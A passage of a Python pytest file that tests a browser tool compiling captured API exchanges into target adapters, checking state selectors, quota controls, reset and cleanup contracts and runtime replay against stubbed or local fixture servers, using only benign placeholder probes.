    assert adapter["api_steps"][0]["method"] == "GET"
    assert adapter["session_cardinality"]["status"] == "unverified"
    capabilities = adapter["state_capabilities"]
    assert capabilities["identity"]["baseline_selector"]["pointer"] == (
        "/result/data/json/run/runId"
    )
    assert capabilities["identity"]["result_selector"]["pointer"] == (
        "/result/data/json/run/runId"
    )
    assert {item["name"] for item in capabilities["observations"]} == {
        "run_id",
        "tier",
        "score",
    }
    score = next(item for item in capabilities["observations"] if item["name"] == "score")
    assert score["baseline_selector"]["pointer"] == "/result/data/json/session/score"
    assert score["result_selector"]["pointer"] == "/result/data/json/turn/score"


@pytest.mark.asyncio
async def test_compiled_api_handoff_seals_evidence_bound_generic_target_capabilities() -> None:
    captured = (
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 400,
            "request_json": {"sessionId": "old", "message": "x" * 501},
            "response_json": {"error": {"code": "input_too_long", "maximum": 500}},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "status": 200,
            "request_json": {"scenario": "reviewed"},
            "response_json": {
                "sessionId": "state-1",
                "resumed": False,
                "state": {
                    "physicalId": "physical-1",
                    "principalId": "principal-1",
                    "stage": 1,
                    "quality": 75,
                    "qualityMirror": 75,
                    "remaining": 25,
                    "resetAt": "2030-01-01T00:00:00Z",
                    "status": "active",
                },
                "availableLanguages": ["en", "ms"],
            },
        },
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "state-1", "message": "harmless probe"},
            "response_json": {
                "reply": "observed response",
                "state": {
                    "stage": 1,
                    "physicalId": "physical-2",
                    "previousPhysicalId": "physical-1",
                    "principalId": "principal-1",
                    "quality": 77,
                    "qualityMirror": 77,
                    "remaining": 24,
                    "resetAt": "2030-01-01T00:00:00Z",
                    "status": "active",
                },
            },
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None
        evidence: list[tuple[object, ...]] = []

        async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
            return {
                "context_id": context_id,
                "target_id": "target",
                "input_pointer": input_pointer,
                "evidence_ref": "native-request:sha256:" + "f" * 64,
            }

        async def record_evidence(self, *value):
            self.evidence.append(value)

        async def record_handoff(self, value):
            self.handoff = value

    arguments = {
        **_compile_arguments(),
        "request_constraints": [
            {
                "path": "/message",
                "step_id": "observed-message-exchange",
                "evaluation_root": "request_body",
                "kind": "string_length",
                "maximum": 500,
                "unit": "unicode_characters",
                "source": "server_validation_response",
                "confidence": 1.0,
                "evidence_selector": {
                    "status_codes": [400],
                    "pointer": "/error/maximum",
                    "match_values": [500],
                },
            }
        ],
        "state_observations": [
            {
                "name": "remote_state_id",
                "role": "state_identity",
                "baseline_selector": {
                    "pointer": "/state/physicalId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/physicalId",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "value_type": "string",
            },
            {
                "name": "progress_stage",
                "role": "progress_ordinal",
                "baseline_selector": {
                    "pointer": "/state/stage",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/stage",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "preferred_direction": "increase",
                "value_type": "integer",
                "minimum_value": 0,
                "monotonicity": "nondecreasing",
            },
            {
                "name": "objective_score",
                "role": "score",
                "baseline_selector": {
                    "pointer": "/state/quality",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/quality",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "preferred_direction": "increase",
                "value_type": "integer",
                "minimum_value": 0,
                "maximum_value": 100,
                "monotonicity": "nondecreasing",
            },
            {
                "name": "objective_score_mirror",
                "role": "score",
                "baseline_selector": {
                    "pointer": "/state/qualityMirror",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/qualityMirror",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "preferred_direction": "increase",
                "value_type": "integer",
                "minimum_value": 0,
                "maximum_value": 100,
                "monotonicity": "nondecreasing",
            },
            {
                "name": "remaining_allowance",
                "role": "budget_remaining",
                "baseline_selector": {
                    "pointer": "/state/remaining",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/remaining",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "preferred_direction": "decrease",
                "value_type": "integer",
                "minimum_value": 0,
                "monotonicity": "nonincreasing",
            },
            {
                "name": "terminal_state",
                "role": "terminal_status",
                "baseline_selector": {
                    "pointer": "/state/status",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/state/status",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "success_values": ["complete"],
                "failure_values": ["failed"],
                "value_type": "string",
            },
        ],
        "state_enumerations": [
            {
                "name": "language",
                "selector": {
                    "pointer": "/availableLanguages",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "shape": "flat",
                "completeness": "complete",
            }
        ],
        "corroboration_rules": [
            {
                "name": "score_fields_agree",
                "observation_names": ["objective_score", "objective_score_mirror"],
                "minimum_agreement": 2,
            }
        ],
        "identity_equivalence_rules": [
            {
                "name": "rotated_identifier_links_previous",
                "relation": "equal",
                "left_selector": {
                    "pointer": "/state/physicalId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "right_selector": {
                    "pointer": "/state/previousPhysicalId",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
            },
            {
                "name": "unproven_rotated_identifier_match",
                "relation": "equal",
                "left_selector": {
                    "pointer": "/state/physicalId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "right_selector": {
                    "pointer": "/state/physicalId",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
            },
        ],
        "resource_ownership": [
            {
                "name": "principal_allowance",
                "resource_kind": "quota",
                "resource_observation_name": "remaining_allowance",
                "principal_selector": {
                    "pointer": "/state/principalId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "reset_selector": {
                    "pointer": "/state/resetAt",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
            },
            {
                "name": "invalid_interaction_reset",
                "resource_kind": "quota",
                "resource_observation_name": "remaining_allowance",
                "principal_selector": {
                    "pointer": "/state/principalId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "reset_selector": {
                    "pointer": "/state/resetAt",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
            },
        ],
    }
    recorder = Recorder()
    tool = next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    )

    result = await tool.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    constraint = adapter["request_constraints"][0]
    assert constraint | {"evidence_refs": []} == {
        "path": "/message",
        "step_id": "observed-message-exchange",
        "evaluation_root": "request_body",
        "kind": "string_length",
        "maximum": 500,
        "unit": "unicode_characters",
        "source": "server_validation_response",
        "evidence_refs": [],
        "evidence_bindings": constraint["evidence_bindings"],
        "confidence": 1.0,
    }
    assert len(constraint["evidence_refs"]) == 2
    assert {item["observed_maximum"] for item in constraint["evidence_bindings"]} == {500}
    capabilities = adapter["state_capabilities"]
    assert capabilities["schema_version"] == "merlin.state-capabilities.v1"
    identity_selector = capabilities["identity"]["baseline_selector"]
    assert capabilities["identity"]["identity_scope"] == "physical_state"
    assert identity_selector["pointer"] == "/state/physicalId"
    assert identity_selector["step_id"] == "observed-session-setup"
    assert identity_selector["evaluation_root"] == "response_body"
    assert identity_selector["schema_version"] == "merlin.state-selector.v1"
    assert len(identity_selector["evidence_refs"]) == 1
    assert identity_selector["evidence_refs"][0].startswith("browser-api-response:sha256:")
    assert {item["name"] for item in capabilities["observations"]} == {
        "progress_stage",
        "objective_score",
        "terminal_state",
        "remote_state_id",
        "objective_score_mirror",
        "remaining_allowance",
    }
    assert len(capabilities["enumerations"]) == 1
    enumeration = capabilities["enumerations"][0]
    assert enumeration["name"] == "language"
    assert enumeration["shape"] == "flat"
    assert enumeration["completeness"] == "complete"
    assert enumeration["selector"]["pointer"] == "/availableLanguages"
    assert enumeration["selector"]["step_id"] == "observed-session-setup"
    assert enumeration["selector"]["evidence_refs"][0].startswith(
        "browser-api-response:sha256:"
    )
    assert capabilities.get("affordances", []) == []
    assert capabilities.get("freshness_rules", []) == []
    assert capabilities["identity_equivalence_rules"][0]["relation"] == "equal"
    assert len(capabilities["identity_equivalence_rules"]) == 1
    assert capabilities["identity_equivalence_rules"][0]["left_selector"]["pointer"] == (
        "/state/physicalId"
    )
    assert capabilities["identity_equivalence_rules"][0]["right_selector"]["pointer"] == (
        "/state/previousPhysicalId"
    )
    ownership = capabilities["resource_ownership"][0]
    assert len(capabilities["resource_ownership"]) == 1
    assert ownership["authority"] == "adapter_origin"
    assert ownership["resource_kind"] == "quota"
    assert ownership["resource_observation_name"] == "remaining_allowance"
    assert ownership["principal_selector"]["pointer"] == "/state/principalId"
    assert "principal-1" not in json.dumps(capabilities)
    assert capabilities.get("corroboration_rules", []) == []
    uncertainty_sources = {item["source"] for item in adapter.get("evaluation_uncertainties", [])}
    assert "browser_compile_api_handoff.identity_equivalence_rules" in uncertainty_sources
    assert "browser_compile_api_handoff.resource_ownership" in uncertainty_sources
    assert "browser_compile_api_handoff.corroboration_rules" in uncertainty_sources
    observations = {item["name"]: item for item in capabilities["observations"]}
    assert (observations["progress_stage"] | {"evidence_refs": []}).items() >= {
        "value_type": "integer",
        "minimum_value": 0,
        "monotonicity": "nondecreasing",
        "trust_class": "target_reported",
        "evidence_refs": [],
    }.items()
    assert (observations["objective_score"] | {"evidence_refs": []}).items() >= {
        "value_type": "integer",
        "minimum_value": 0,
        "maximum_value": 100,
        "monotonicity": "nondecreasing",
        "trust_class": "target_reported",
        "evidence_refs": [],
    }.items()
    for observation in observations.values():
        assert observation["trust_class"] == "target_reported"
        assert len(observation["baseline_selector"]["evidence_refs"]) == 1
        assert len(observation["result_selector"]["evidence_refs"]) == 1
        assert observation["baseline_selector"]["evidence_refs"][0].startswith(
            "browser-api-response:sha256:"
        )
        assert observation["result_selector"]["evidence_refs"][0].startswith(
            "browser-api-response:sha256:"
        )
    recorded_refs = {item[1] for item in recorder.evidence}
    assert set(constraint["evidence_refs"]).issubset(recorded_refs)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("affordance_kind", "operation", "ack_pointer", "resource_kind", "window_key"),
    [
        ("reset_state", "reset", "/reset", "quota", "daily"),
        ("clone_state", "clone", "/cloned", "rate_limit", "sixty_seconds"),
        ("restore_checkpoint", "restore", "/restored", "quota", "daily"),
    ],
)
async def test_generic_fixture_recon_compiles_state_and_resource_controls(
    affordance_kind: str,
    operation: str,
    ack_pointer: str,
    resource_kind: str,
    window_key: str,
    tmp_path: Path,
) -> None:
    async with StatefulTargetFixtureServer(interaction_quota=1) as target:
        async with httpx.AsyncClient(base_url=target.origin) as client:
            started = (await client.post("/api/start", json={})).json()
            session_id = started["sessionId"]
            await client.post(f"/api/{operation}", json={"sessionId": session_id})
            await client.post(
                "/api/message", json={"sessionId": session_id, "message": "reviewed probe"}
            )
            await client.post(
                "/api/message", json={"sessionId": session_id, "message": "quota probe"}
            )
            await client.post("/api/cleanup", json={"sessionId": session_id})

        cleanup_action, _, cleanup_ref = _cleanup_action_records()
        setup_action, _ = _setup_action_records()
        base_time = _SETUP_ACTION_AT + timedelta(seconds=1)
        events = []
        for index, row in enumerate(target.http_log):
            event = {
                "method": row["method"],
                "url": target.origin + str(row["path"]),
                "status": row["status"],
                "request_json": row["request"],
                "response_json": row["response"],
                "observed_at": (base_time + timedelta(seconds=index)).isoformat(),
            }
            if row["operation"] == "start":
                event.update(
                    {
                        "_observation_step": setup_action.step,
                        "_observation_tab_ref": setup_action.tab_ref,
                        "trigger_action_ref": _SETUP_ACTION_REF,
                    }
                )
            if row["operation"] == "cleanup":
                event["observed_at"] = _CLEANUP_RESPONSE_AT.isoformat()
                event["trigger_action_ref"] = cleanup_ref
            events.append(event)

        class Session:
            context_id = "browser-context"
            bounds = SimpleNamespace(target_id="target", allowed_origins=frozenset({target.origin}))
            owner = owner()

            def api_exchange_events(self):
                return tuple(events)

        class Recorder(_CleanupActionRecorder):
            handoff = None
            evidence: list[tuple[object, ...]] = []

            async def record_evidence(self, *value):
                self.evidence.append(value)

            async def record_handoff(self, value):
                self.handoff = value

        baseline_pointer = "/state/id"
        arguments = {
            **_compile_arguments(),
            "url": target.origin + "/api/message",
            "cleanup_url": target.origin + "/api/cleanup",
            "cleanup_method": "POST",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
            "supported_modalities": [
                {"modality": "text", "request_pointer": "/message", "confidence": 1.0},
                {"modality": "image", "request_pointer": "/message", "confidence": 0.4},
            ],
            "state_observations": [
                {
                    "name": "physical_state",
                    "role": "state_identity",
                    "baseline_selector": {
                        "step_id": "observed-session-setup",
                        "evaluation_root": "response_body",
                        "pointer": baseline_pointer,
                    },
                    "result_selector": {
                        "step_id": "observed-message-exchange",
                        "evaluation_root": "response_body",
                        "pointer": baseline_pointer,
                    },
                    "value_type": "string",
                },
                {
                    "name": "remaining_resource",
                    "role": "budget_remaining",
                    "baseline_selector": {
                        "step_id": "observed-session-setup",
                        "evaluation_root": "response_body",
                        "pointer": "/hostState/quotaRemaining",
                    },
                    "result_selector": {
                        "step_id": "observed-message-exchange",
                        "evaluation_root": "response_body",
                        "pointer": "/hostState/quotaRemaining",
                    },
                    "value_type": "integer",
                    "minimum_value": 0,
                    "maximum_value": 1,
                    "monotonicity": "nonincreasing",
                },
            ],
            "resource_ownership": [
                {
                    "name": "principal_daily_resource",
                    "resource_kind": resource_kind,
                    "resource_observation_name": "remaining_resource",
                    "principal_selector": {
                        "step_id": "observed-session-setup",
                        "evaluation_root": "response_body",
                        "pointer": "/principalId",
                    },
                    "reset_selector": {
                        "step_id": "observed-session-setup",
                        "evaluation_root": "response_body",
                        "pointer": "/hostState/quotaResetAt",
                    },
                }
            ],
            "resource_controls": [
                {
                    "ownership_name": "principal_daily_resource",
                    "limit": 1,
                    "window_key": window_key,
                    "status_codes": [429],
                    "retry_after_seconds_pointer": "/error/retryAfterSeconds",
                }
            ],
            "state_affordances": [
                {
                    "kind": affordance_kind,
                    "method": "POST",
                    "url": target.origin + f"/api/{operation}",
                    "status_codes": [200],
                    "pointer": ack_pointer,
                    "match_values": [True],
                    "confidence": 1.0,
                }
            ],
        }
        if affordance_kind == "restore_checkpoint":
            arguments["checkpoint"] = {
                "capture_selector": {
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                    "pointer": "/sessionId",
                },
                "capture_timing": "live_handle",
                "binding_name": "session_id",
                "restore_request_pointer": "/sessionId",
            }
        if affordance_kind == "clone_state":
            arguments["state_affordances"][0]["identity_pointer"] = "/state/id"
        recorder = Recorder()
        tool = next(
            item
            for item in browser_tools(lambda _: Session(), recorder)
            if item.describe().name == "browser_compile_api_handoff"
        )
        result = await tool.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)
        adapter = json.loads(recorder.handoff.adapter)

        if affordance_kind == "reset_state":
            runtime_adapter = json.loads(json.dumps(adapter))
            runtime_adapter["state_capabilities"].pop("resource_controls")
            runtime_adapter["state_capabilities"].pop("resource_ownership")

            async def requester(
                _campaign_id: str,
                request_method: str,
                request_url: str,
                request: object,
                _headers: object,
            ) -> tuple[int, object]:
                async with httpx.AsyncClient() as runtime_client:
                    response = await runtime_client.request(
                        request_method, request_url, json=request
                    )
                return response.status_code, response.json()

            campaign_id = "campaign/generic-recon-state-contract"
            with Database(DatabaseConfig(data_dir=tmp_path / "postgres")) as database:
                with database.connect() as connection:
                    MigrationRunner(connection).apply()
                    session = SessionRepository(connection).create("generic recon state contract")
                    CampaignStore(connection).prepare(
                        campaign_id,
                        str(session.id),
                        {"manifest": {"id": campaign_id}, "assignment_context": {}},
                        "sha256:reviewed",
                    )
                    runtime = ReviewedApiTargetTool(
                        CampaignApiSessionRepository(connection),
                        lambda _campaign_id: runtime_adapter,
                        {},
                        browser_api_requester=requester,
                    )
                    execution = await runtime.invoke(
                        ToolContext(
                            session_id=str(session.id),
                            workspace_root="/tmp",
                            call_id="call-1",
                            agent_id=f"{campaign_id}/worker",
                            campaign_id=campaign_id,
                            target_id="target",
                        ),
                        {"input": "runtime candidate"},
                    )
            assert execution.is_error is False, execution.content

    assert result.is_error is False, result.content
    capabilities = adapter["state_capabilities"]
    assert {item["kind"] for item in capabilities["affordances"]} >= {
        affordance_kind,
        "cleanup_state",
    }
    assert capabilities["supported_modalities"][0]["modality"] == "text"
    assert len(capabilities["supported_modalities"]) == 1
    assert capabilities["resource_ownership"][0]["resource_kind"] == resource_kind
    assert capabilities["resource_controls"][0]["window_key"] == window_key
    assert (
        capabilities["resource_controls"][0]["structured_blocks"][0]["retry_after_seconds_pointer"]
        == "/error/retryAfterSeconds"
    )
    if affordance_kind == "restore_checkpoint":
        assert capabilities["checkpoint"]["restore_request_pointer"] == "/sessionId"
    assert "browser_compile_api_handoff.supported_modalities" in {
        item["source"] for item in adapter["evaluation_uncertainties"]
    }


@pytest.mark.asyncio
async def test_compiled_api_handoff_routes_only_success_to_assessment_prepare() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    tool = next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    )

    success = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )
    failure = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {**_compile_arguments(), "input_pointer": "/missing"},
    )

    assert success.is_error is False
    assert success.metadata["preferred_next_tool"] == "assessment_prepare"
    assert failure.is_error is True
    assert "preferred_next_tool" not in failure.metadata


def test_api_handoff_schema_distinguishes_terminal_from_cleanup_statuses() -> None:
    compiler = next(
        item
        for item in browser_tools(lambda _: None, object())
        if item.describe().name == "browser_compile_api_handoff"
    )
    properties = compiler.describe().input_schema["properties"]

    terminal = properties["terminal_response_contract"]
    assert terminal["properties"]["status_codes"]["items"] == {
        "type": "integer",
        "minimum": 100,
        "maximum": 599,
    }
    condition_status = terminal["properties"]["conditions"]["items"]["properties"]["status_codes"][
        "items"
    ]
    assert condition_status == {"type": "integer", "minimum": 100, "maximum": 599}
    cleanup_status = properties["cleanup_acknowledgement"]["properties"]["status_codes"]["items"]
    assert cleanup_status == {"type": "integer", "minimum": 200, "maximum": 299}


@pytest.mark.asyncio
async def test_api_handoff_compiler_resolves_observed_user_message_alias_at_runtime(
    tmp_path: Path,
) -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {
                        "sessionId": "reviewed-session",
                        "userMessage": "English reconnaissance baseline",
                        "levelId": 1,
                    },
                    "response_json": {"text": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments["input_pointer"] = "/message"
    arguments["response_selector"] = "/text"
    recorder = Recorder()
    result = await next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {
        "sessionId": "reviewed-session",
        "userMessage": "{{input}}",
        "levelId": 1,
    }

    requests: list[object] = []

    async def requester(
        _campaign_id: str,
        _method: str,
        _url: str,
        request: object,
        _headers: object,
    ) -> tuple[int, object]:
        requests.append(request)
        return 200, {"text": "target reply"}

    campaign_id = "campaign/compiler-runtime-observed-alias"
    with Database(DatabaseConfig(data_dir=tmp_path / "postgres")) as database:
        with database.connect() as connection:
            MigrationRunner(connection).apply()
            session = SessionRepository(connection).create("compiler observed alias bridge")
            CampaignStore(connection).prepare(
                campaign_id,
                str(session.id),
                {"manifest": {"id": campaign_id}, "assignment_context": {}},
                "sha256:reviewed",
            )
            target = ReviewedApiTargetTool(
                CampaignApiSessionRepository(connection),
                lambda _campaign_id: adapter,
                {},
                browser_api_requester=requester,
            )
            response = await target.invoke(
                ToolContext(
                    session_id=str(session.id),
                    workspace_root="/tmp",
                    call_id="call-1",
                    agent_id=f"{campaign_id}/worker",
                    campaign_id=campaign_id,
                    target_id="target",
                ),
                {"input": "你好，请说明退款政策"},
            )

    assert response.is_error is False
    assert requests == [
        {
            "sessionId": "reviewed-session",
            "userMessage": "你好，请说明退款政策",
            "levelId": 1,
        }
    ]


@pytest.mark.asyncio
async def test_api_handoff_compiler_rejects_unrelated_missing_input_leaf() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"prompt": "observed prompt"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is True
    assert result.content == "input_pointer does not exist in the captured request"
    assert recorder.handoff is None


@pytest.mark.asyncio
async def test_api_handoff_compiler_preserves_unambiguous_input_path() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {
                        "prompt": "observed prompt",
                        "control": "preserve me",
                    },
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments["input_pointer"] = "/prompt"
    recorder = Recorder()
    result = await next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {
        "prompt": "{{input}}",
        "control": "preserve me",
    }


@pytest.mark.asyncio
async def test_api_handoff_terminal_contract_executes_unchanged(
    tmp_path: Path,
) -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {
                        "message": "harmless probe",
                        "userMessage": "English reconnaissance baseline",
                        "levelId": 1,
                    },
                    "response_json": {"text": "observed response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {
                        "message": "last allowed harmless probe",
                        "userMessage": "English reconnaissance baseline",
                        "levelId": 1,
                    },
                    "response_json": {
                        "text": "terminal response",
                        "gameStatus": "lost",
                        "messagesRemaining": 0,
                    },
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 400,
                    "request_json": {
                        "message": "harmless post-terminal probe",
                        "userMessage": "English reconnaissance baseline",
                        "levelId": 1,
                    },
                    "response_json": {"error": "Game already ended"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/forfeit",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {},
                    "response_json": {"closed": True},
                },
            )

    class Recorder(_CleanupActionRecorder):
        handoff = None
        evidence = []

        async def record_evidence(self, context_id, evidence_ref, kind, payload):
            self.evidence.append((context_id, evidence_ref, kind, payload))

        async def record_handoff(self, value):
            self.handoff = value

    arguments = _compile_arguments()
    arguments["response_selector"] = "/text"
    arguments["terminal_response_contract"] = {
        "conditions": [
            {
                "pointer": "/gameStatus",
                "match_values": ["lost"],
                "status_codes": [200],
                "effect_applied": True,
                "replay_safe": False,
            },
            {
                "pointer": "/error",
                "match_values": ["Game already ended"],
                "status_codes": [400],
                "effect_applied": False,
                "replay_safe": True,
            },
        ]
    }
    arguments["cleanup_method"] = "POST"
    arguments["cleanup_url"] = "https://target.test/api/forfeit"
    arguments["cleanup_acknowledgement"] = {
        "pointer": "/closed",
        "match_values": [True],
        "status_codes": [200],
    }
    recorder = Recorder()

    result = await next(
        item
        for item in browser_tools(lambda _: Session(), recorder)
        if item.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["cleanup_lifecycle"]["status"] == "observed"
    assert adapter["api_steps"][-1]["endpoint"] == "https://target.test/api/forfeit"
    terminal_contract = adapter["api_steps"][0]["terminal_response_contract"]
    assert len(terminal_contract["conditions"]) == 2
    assert all(
        condition["predicate_observation"]["source"] == "observed_terminal_exchange"
        for condition in terminal_contract["conditions"]
    )
    assert all(
        len(condition["predicate_observation"]["evidence_refs"]) == 2
        for condition in terminal_contract["conditions"]
    )
    assert all(
        condition["effect_attestation"] == {"source": "operator_reviewed_contract"}
        for condition in terminal_contract["conditions"]
    )
    assert adapter["interaction_limit"]["status"] == "unverified"
    assert adapter["interaction_limit"]["maximum_interactions"] is None
    assert adapter["interaction_limit"]["source"] == "observed_terminal_exchange"
    assert len(adapter["interaction_limit"]["evidence_refs"]) == 4
    recorded_refs = {item[1] for item in recorder.evidence}
    assert set(adapter["interaction_limit"]["evidence_refs"]) <= recorded_refs
    assert adapter["api_steps"][0]["request_template"] == {
        "message": "{{input}}",
        "userMessage": "{{input}}",
        "levelId": 1,
    }

    generations = messages = 0

    async def requester(
        _campaign_id: str,
        _method: str,
        _url: str,
        request: object,
        _headers: object,
    ) -> tuple[int, object]:
        nonlocal generations, messages
        if _url.endswith("/forfeit"):
            assert request == {}
            return 200, {"closed": True}
        expected_input = "terminal probe" if messages < 2 else "distinct probe"
        assert request == {
            "message": expected_input,
            "userMessage": expected_input,
            "levelId": 1,
        }
        messages += 1
        if generations == 0:
            generations = 1
            return 200, {
                "text": "terminal target reply",
                "gameStatus": "lost",
                "messagesRemaining": 0,
            }
        return 200, {"text": "fresh distinct reply"}

    campaign_id = "campaign/compiler-runtime-terminal-contract"
    with Database(DatabaseConfig(data_dir=tmp_path / "postgres")) as database:
        with database.connect() as connection:
            MigrationRunner(connection).apply()
            session = SessionRepository(connection).create("compiler runtime bridge")
            CampaignStore(connection).prepare(
                campaign_id,
                str(session.id),
                {"manifest": {"id": campaign_id}, "assignment_context": {}},
                "sha256:reviewed",
            )
            sessions = CampaignApiSessionRepository(connection)
            target = ReviewedApiTargetTool(
                sessions,
                lambda _campaign_id: adapter,
                {},
                browser_api_requester=requester,
            )
            context = ToolContext(
                session_id=str(session.id),
                workspace_root="/tmp",
                call_id="call-1",
                agent_id=f"{campaign_id}/worker",
                campaign_id=campaign_id,
                target_id="target",
            )
            terminal = await target.invoke(context, {"input": "terminal probe"})
            repeated = await target.invoke(context, {"input": "terminal probe"})
            distinct = await target.invoke(context, {"input": "distinct probe"})

    assert terminal.is_error is False
    assert json.loads(terminal.content) == "terminal target reply"
    assert terminal.metadata["target_session_generation"] == 1
    assert "target_session_terminal" not in terminal.metadata
    assert terminal.metadata["evaluation_uncertain"] is True
    terminal_exchange = terminal.metadata["target_exchanges"][-1]
    assert "response_body" not in terminal_exchange
    assert terminal_exchange["response_body_summary"]["kind"] == "object"
    assert terminal_exchange["response_body_summary"]["fields"] == [
        "gameStatus",
        "messagesRemaining",
        "text",
    ]
    assert terminal_exchange["response_body_summary"]["item_count"] == 3
    assert terminal.metadata["target_exchanges"][-1]["outcome"] == "evaluation_uncertain"
    assert terminal.metadata["target_exchanges"][-1]["terminal_response_observation"] == {
        "matched": True,
        "effect_applied": True,
        "replay_safe": False,
    }
    assert repeated.is_error is False
    assert json.loads(repeated.content) == "fresh distinct reply"
    assert repeated.metadata["target_session_generation"] == 1
    assert distinct.is_error is False
    assert json.loads(distinct.content) == "fresh distinct reply"
    assert distinct.metadata["target_session_generation"] == 1
    assert messages == 3


@pytest.mark.asyncio
async def test_api_handoff_terminal_evidence_cannot_come_from_unrelated_endpoint() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"text": "ordinary response"},
                },
                {
                    "method": "POST",
